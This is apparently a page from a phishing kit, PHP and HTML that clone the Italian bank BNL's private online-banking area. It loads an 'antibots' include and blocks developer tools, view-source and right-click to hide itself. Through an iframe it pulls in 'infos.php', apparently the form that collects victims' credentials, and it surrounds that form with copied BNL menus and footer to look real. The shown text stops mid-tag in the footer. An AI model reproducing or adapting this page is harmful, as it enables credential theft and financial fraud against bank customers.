<?php
session_start();
error_reporting(0);

include_once "../antibots.php";

?>
<!DOCTYPE html>
<html lang="it"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible"><title>Pass BNL</title>
<link type="image/x-icon" href="./css/favicon.ico" rel="shortcut icon">
<!--ls:begin[stylesheet]-->
<link href="./css/hellobank-layout.css" type="text/css" rel="stylesheet">
<link type="text/css" href="./css/hellobank-secureint.css" rel="stylesheet">
<link type="text/css" href="./css/hellobank-common.css" rel="stylesheet">
<link type="text/css" href="./css/footer_asinc_private.css" rel="stylesheet">
<link type="text/css" href="./css/style.css" rel="stylesheet">


<link type="image/x-icon" href="https://banking.bnl.it/rsc/contrib/graphicaltheme/bnl-public/img/favicon.ico" rel="shortcut icon">
  <script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener("contextmenu", function(e) {
	  e.preventDefault();
	});

</script>
<!--ls:begin[head-injection]--><meta name="siteid" content="bnl-private"><meta name="nodeid" content="null"><meta name="viewport" content="width=1100"><link id="cookie-law-css" rel="stylesheet" type="text/css" href="./css/cookie-law.css" media="all"></head>
<body class="it PC world priv theme-green" style="cursor: default;"><div id="sf-master"><!--sf:begin[div:sf-master]--><!--ls:begin[body]--><div class="ls-canvas hellobank-canvas" id="ls-canvas">
<div class="ls-row container wrapped-1024" id="ls-row-1">
<div class="ls-fxr" id="ls-gen1618033-ls-fxr">
<div class="ls-col hellobank-body" id="ls-row-1-col-1">
<div class="ls-col-body" id="ls-gen1618034-ls-col-body">
<div class="ls-row hellobank-header-row" id="ls-row-1-col-1-row-1">
<div class="ls-fxr" id="ls-gen1618035-ls-fxr">
<div class="ls-area hellobank-header" id="ls-row-1-col-1-row-1-area-1">
<div class="ls-area-body" id="ls-gen1618036-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1468595608098">
<div class="iw_component" id="1468595608098">
</div>
</div>
<div class="ls-cmp-wrap" id="w1468595608099">
<div class="iw_component" id="1468595608099">
</div>
</div>
<div class="ls-cmp-wrap" id="w1468595608100">
<div class="iw_component" id="1468595608100"><!--content start--><div id="wcm-l-">
<div class="wcm-richxml style-default theme-green">
		
		
		<div class="wcm-richxml-content">
<div class="xml-document ">
<div class="xml-content ">
<div class="xml-layout ">
<table style="width:100%">
<tbody><tr>
<td class="col1 full-width">
<div id="toolbarContainerRegion" class="xml-region">
<div id="toolbarContainerSection" class="xml-section level1 ">
<p id="idLogoBigToolbar" style="clear:both;text-align:right;">
<a href="#"></a>
</p>
<p id="idChiamami" style="clear:both;text-align:right;">
<a href="#">CONTATTACI</a>
</p>
<p id="idFiliali" style="clear:both;text-align:right;">
<a href="#" target="_blank">FILIALI</a>
</p>
</div>
<div id="userWelcomeBoxContainerSection" class="xml-section level1 "><iframe id="iframe_userWelcomeBox" frameborder="no" scrolling="no" allowtransparency="true" width="100%" height="77px" src="./css/UserWelcomeBox.html" style="height: 77px;"></iframe></div>
<div id="toolbarContentsContainer" class="xml-section level1 ">
<p id="buttonsIframeContrainer" style="clear:both;"></p>
<p id="menuPreferiti" style="clear: both; display: BLOCK;"></p>
</div>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</div>
</div>
		
		
	</div>
</div><!--content stop-->
</div>
</div>

</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row hellobank-content-row" id="ls-row-1-col-1-row-2">
<div class="ls-fxr" id="ls-gen1618037-ls-fxr">
<div class="ls-area hellobank-content" id="ls-row-1-col-1-row-2-area-1">
<div class="ls-area-body" id="ls-gen1618038-ls-area-body">

<div class="ls-cmp-wrap" id="w1468595608102">
<div class="iw_component" id="1468595608102"><div style="" class="IA TargetSample style-default theme-green" id="iframeVadClienti45887">
<iframe src="./infos.php" allowtransparency="true" frameborder="no" scrolling="no" height="500px" width="1024px" id="iframe" style="height: 684px;">
					</iframe>

</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1508019269117">
<div class="iw_component" id="1508019269117"><div class="bnl-navigation style-tiles-menu
    			theme-green">
<ul>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#MovimentiCC/?id=controllo" >
<div class="tile-image" id="tile_controllo"></div>CONTROLLO</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso" href="#MovimentiCC/" >Saldo e movimenti C/C</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BilancioPersonale/" >Bilancio personale</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="/it/home/navigation/CONTROLLO/Carte-di-credito-e-Prepagate" >Carte di credito e Prepagate</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="/it/home/navigation/CONTROLLO/Domiciliazione" >Domiciliazione</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#MutuiPrestiti/" >Mutui e prestiti</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#" >Portafoglio Titoli</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PortafoglioRisparmioGestito/" >Risparmio gestito</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PortafoglioBnlVita/" >Polizze vita</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PolizzeAssicurative/" >Polizze Assicurative</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/CONTROLLO/Carta-BNL-Credit" >Carta BNL Credit</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#" >Disposizioni Inviate</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=italia&amp;target=lista" >Lista Bonifico Sepa Italia</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoDetrazione/?target=lista" >Lista Bonifico Agevolazioni Fiscali</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=sepa&amp;target=lista" >Lista Bonifico Sepa Europa</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoPeriodico/?target=lista" >Lista Bonifico Periodico</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Giroconto/?target=lista" >Lista Giroconto</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCellulari/?target=lista" >Lista Ricarica Cellulari</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCartaPrepagata/?target=lista" >Lista Ricarica Carte Prepagate</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BollettiniPostali/?target=lista" >Lista Bollettini Postali</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoUtenza/?target=lista" >Lista utenze Convenzionate</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoMavRav/?redirectPage=lista" >Lista MAV/RAV</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F24/?flagLista=true" >Lista Imposte e Tasse F24</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F23/?target=lista" >Lista Imposte e Tasse F23</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#CBill/?target=listaricerca" >Lista Pagamento CBill</a>
</li>
</ul>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa?id=pago&amp;bonifico_tipoBonifico=italia" >
<div class="tile-image" id="tile_pago"></div>PAGO</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoDonazioni?target=terremoto" >Donazioni Emergenza Terremoto</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa?bonifico_tipoBonifico=italia" >Bonifico Sepa Italia</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa?bonifico_tipoBonifico=italia" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=italia&amp;target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=italia&amp;target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoDetrazione/" >Bonifico Agevolazioni Fiscali</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoDetrazione/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoDetrazione/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoDetrazione/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa?bonifico_tipoBonifico=sepa" >Bonifico Sepa Europa</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa?bonifico_tipoBonifico=sepa" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=sepa&amp;target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoEuropa/?bonifico_tipoBonifico=sepa&amp;target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoPeriodico/" >Bonifico Periodico</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoPeriodico/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoPeriodico/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BonificoPeriodico/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#Giroconto/" >Giroconto</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Giroconto/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Giroconto/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Giroconto?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#RicaricaCellulari/" >Ricarica cellulari</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCellulari/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCellulari/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCellulari/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#RicaricaCartaPrepagata/" >Ricarica carte prepagate</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCartaPrepagata/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCartaPrepagata/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#RicaricaCartaPrepagata/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BollettiniPostali/" >Bollettini Postali</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BollettiniPostali/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BollettiniPostali/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#BollettiniPostali/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PagamentoUtenza/" >Utenze Convenzionate</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoUtenza/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoUtenza/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoUtenza/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#DomiciliazioneUtenza/" >domiciliazioni</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DomiciliazioneUtenza/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DomiciliazioneUtenza/?redirectLista=true" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DomiciliazioneUtenza/?redirectRicerca=true" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PagamentoMavRav/" >MAV / RAV</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoMavRav/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoMavRav/?redirectPage=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PagamentoMavRav/?redirectPage=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#F24/?flagUtilizzoAccise=true" >Imposte e tasse F24</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F24/?flagUtilizzoAccise=true" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F24/?flagLista=true" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F24/?flagRicerca=true" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#F23/" >Imposte e tasse F23</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F23" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F23/?target=lista" >Lista</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#F23/?target=ricerca" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/PAGO/Cbill" >Cbill</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#CBill/" >Nuovo</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#CBill/?target=listaricerca" >Stato Pagamenti</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#CBill/?target=statopagamenti" >Ricerca</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BonificoDonazioni/" >Donazioni per telethon</a>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso" href="#MobileBanking/?id=gestisco" >
<div class="tile-image" id="tile_gestisco"></div>GESTISCO</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title">
GESTISCO</h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#MobileBanking/" >SMS Alert</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#MobileBanking/" >Configura servizio</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#MobileBanking/?display=configurazione" >Configura numero</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#Payback/?target=mgmt" >Carta Payback</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#home/navigation/GESTISCO/Carta-Payback/Scopri-Payback" >Scopri Payback</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Payback/" >Associa la tua carta Payback</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#Payback/?target=mgmt" >La mia carta Payback</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#AdesioneDocumentiOnline/" >Documenti Online</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#ProfiloBancomat/" >Profilo carta di debito</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BnlRubricaIBAN/" >Rubrica beneficiari</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/GESTISCO/Gestisci-Il-Tuo-Prestito-BNL-In-Novo-1Click" >Gestisci Il Tuo Prestito BNL In Novo 1Click</a>
</li>
</ul>
</div></div>

<iframe scrolling="no" frameborder="0"></iframe></div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO" >
<div class="tile-image" id="tile_acquisto"></div>ACQUISTO</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/Prestito-Online-BNL"  id="siteMap_LinkPrestitiBnl">Prestito Online BNL</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/Carta-di-Credito" >Carta di Credito</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/Carta-Prepagata" >Carta Prepagata</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#PolizzaMotors/" >Polizza Auto Plus</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/BNL-Carte-No-Problem-Plus" >BNL Carte No Problem Plus</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/Polizza-BNL-Salute" >Polizza BNL Salute</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/ACQUISTO/Polizza-BNL-Casa-e-Famiglia" >Polizza BNL Casa e Famiglia</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#Paperless/" target="_top">Firma online</a>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading" target="_top">
<div class="tile-image" id="tile_trading"></div>trading</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading/home" >home</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading" >customhomepage</a>
</li>
<li class="tile level1">Faq<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading/Faq/Benvenuto" >Benvenuto</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading/Faq/contatti" >contatti</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#home/navigation/trading/Faq/domande" >domande</a>
</li>
</ul>
</li>
</ul>
</div></div>

</div>
</li><li class="contenuto_tastiera" style="display: none;"></li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#IlMioProfiloRB/?id=profilo" >
<div class="tile-image" id="tile_profilo"></div>PROFILO</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#IlMioProfiloRB/" >IBAN/Rapporti Bancari</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#IlMioProfilo/" >Dati personali</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#spid-app/" >IDENTITÀ DIGITALE SPID</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#KYCOnline/" >Questionario cliente</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#DatiMemorabili/" >Domanda segreta</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#ProfiloFinanziario" >Profilo Finanziario</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/PROFILO/GESTIONE-ADDEBITO-INTERESSI-IN-CC" >GESTIONE ADDEBITO INTERESSI IN C/C</a>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#home/navigation/DOCUMENTI" >
<div class="tile-image" id="tile_documenti"></div>DOCUMENTI</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#" >Documenti Online</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=A" >Conti Correnti</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=B" >Servizi finanziari</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=C" >Mutui e prestiti</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=D" >Carte di debito</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=E" >Carte di credito</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=F" >Canali diretti</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=H" >Carte prepagate</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#DocumentiOnline/?bnlDocTipoProdotto=I" >Carte di credito aziendali</a>
</li>
</ul>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#DematAlloSportello/" >Ricevute Operazioni in Filiale</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#" >Prodotti sottoscritti online</a>
<ul>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#PolizzeAssicurative/" >Polizze Assicurative</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#ConsultazioneContratti/" >Conto corrente</a>
</li>
<li class="tile level2">
<a class="show_hide menuChiuso
								" href="#ContrattiOnline/" >Altri Prodotti</a>
</li>
</ul>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay" >
<div class="tile-image" id="tile_InnovativePayment"></div>bnl pay</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Scopri-BNL-PAY" >Scopri BNL PAY</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Invia-denaro-Jiffy" >Invia denaro Jiffy</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Acquisti-on-line-MasterPass" >Acquisti on line MasterPass</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Pagamento-Soste-Auto-Smarticket" >Pagamento Soste Auto Smarticket</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Pagamenti-NFC" >Pagamenti NFC</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/Gestione-Carta" >Gestione Carta</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#home/navigation/bnl-pay/gestione-contratto" >gestione contratto</a>
</li>
</ul>
</div></div>

</div>
</li>
<li class="tile level0">
<a class="show_hide menuChiuso
								" href="#BnlMessageBox/?id=messaggi" >
<div class="tile-image" id="tile_messaggi"></div>MESSAGGI</a>
<div class="slidingDiv">
<div class="frecciaAperta" style="left: 509.5px;">
<a href="#" class="dim_freccia"></a>
</div>
<div class="leftmenu-wrapper"><h1 class="menu-title"></h1><div class="content_menusx">
<ul>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BnlMessageBox/?dateList=TUTTI" >Lista Completa</a>
</li>
<li class="tile level1">
<a class="show_hide menuChiuso
								" href="#BnlMessageBox/?dateList=TUTTI&amp;stateList=10" >Da Leggere</a>
</li>
</ul>
</div></div>

</div>
</li><li class="contenuto_tastiera" style="display: none"></li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row footer" id="ls-row-1-col-1-row-3" style="position: unset !important;">
<div class="ls-fxr" id="ls-gen42252099-ls-fxr">
<div class="ls-area" id="ls-row-1-col-1-row-3-area-1">
<div class="ls-area-body" id="ls-gen42252100-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1444052838073">
<div class="iw_component" id="1444052838073"><!--content start--><div id="MGM_Footer_banner_20_2_256X256-1444052838073" class="wcm-clickimage  style-default theme-green">
<a  href="#https://bnl.it/it/Individui-e-Famiglie/Operazione-a-Premi-Presentaci-amico" onclick=""><img src="./img/footerbanner_MGM_Bnl.jpg" alt="Presentaci un amico"></a>
</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1516871143610">
<div class="iw_component" id="1516871143610"><!--content start--><div id="wcm-l-contrattoMT">
<div class="wcm-html style-default theme-green"><div id="cmt_default_banner" data-campaign-code="22001860">	<a href="#">			<img alt="Comunicazioni al Cliente" src="./img/FB_carta_classic_20_euro.jpg">	</a></div></div>
</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1516871143611">
<div class="iw_component" id="1516871143611"><!--content start--><div id="gdpr_footer_banner-1516871143611" class="wcm-clickimage  style-default theme-green">
<a  href="#" onclick="#"><img src="./img/Gdpr_footer_banner_BNL.jpg" alt="responsabilita sociale"></a>
</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1516871143612">
<div class="iw_component" id="1516871143612"><!--content start--><div id="Bnl_Footer_Banner_prestito-1516871143612" class="wcm-clickimage  style-default theme-green">
<a onclick="" href=""><img src="./img/footerFindo.jpg" alt="Bnl_Footer_Banner_prestito"></a>
</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1516871143613">
<div class="iw_component" id="1516871143613"><!--content start--><div id="wcm-l-footer">
<div class="wcm-html style-default theme-green"><div id="div_footer">	<div id="div_leftFooter">		<a  title="Hello Bank" href=""><div class="icon icon-hello-bank"></div></a>		<a  title="Life Banker" href=""><div class="icon icon-life-banker"></div></a>		<a href="" id="a_trasparenza" title="TRASPARENZA" onclick="" style="position: absolute; margin-top: 4px; left: 93px;"><img src="./img/trasparenza_BNL-1.jpg" alt="TRASPARENZA" id="img_trasparenza"></a>	</div>	<div id="div_centerFooter">		<div id="div_headerFooter">			<a title="DATI SOCIETARI" href="">DATI SOCIETARI</a>			<a title="PROSPETTI CONSOB" >PROSPETTI CONSOB</a>			<a title="RECLAMI-RICORSI-CONCILIAZIONE" >RECLAMI-RICORSI-CONCILIAZIONE</a>			<a title="ARBITRO CONTROVERSIE FINANZIARIE" href="https://www.acf.consob.it/" target="_blank">ARBITRO CONTROVERSIE FINANZIARIE</a>			<!--<a title="COMPARA CONTI" href="https://bnl.it/it/Footer/compara-conti">COMPARA CONTI</a>-->			<a title="PRIVACY" href="">PRIVACY</a>				<a href="/rsc/SupportingFiles/carta-responsabilita-dati-personali-BNL.pdf  " target="_blank" title="CARTA RESPONSABILITÀ">CARTA RESPONSABILITÀ DATI PERSONALI</a>			<a title="NOTE LEGALI "href="#ttps://bnl.it/it/Footer/Note-Legali">NOTE LEGALI</a>			<a title="COOKIE "href="#ttps://bnl.it/it/Footer/Cookie">COOKIE</a>			<a title="CONTATTI INSTITUZIONALI "href="#ttps://bnl.it/it/Individui-e-Famiglie/Contatti/Contatti-Istituzionali">CONTATTI INSTITUZIONALI</a>		</div>		<div id="div_disclaimerFooter">				I contenuti del sito hanno prevalentemente carattere promozionale e finalità pubblicitarie		</div>		</div>	<div id="div_rightFooter">		<a target="_blank" title="Facebook "href="#ttps://www.facebook.com/BNLPeople"><div class="icon icon-facebook"></div></a>		<a 